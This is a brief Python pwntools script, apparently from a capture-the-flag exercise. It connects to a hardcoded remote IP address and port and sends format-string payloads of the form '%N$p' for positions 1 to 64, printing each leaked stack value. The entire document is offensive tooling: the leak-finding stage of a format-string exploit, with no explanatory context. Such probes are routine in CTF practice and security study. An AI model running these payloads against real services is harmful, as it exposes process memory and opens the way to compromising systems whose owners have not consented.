from pwn import *

ip, port = '178.128.46.49', 32052
io = remote(ip, port)

def detect():
        for i in range(64):
                io.recvuntil('>')
                io.sendline('%'+str(i+1)+'$p')
                buf = io.recvline().strip().split(' ')[0]
                print str(i+1)+' : '+buf

detect()
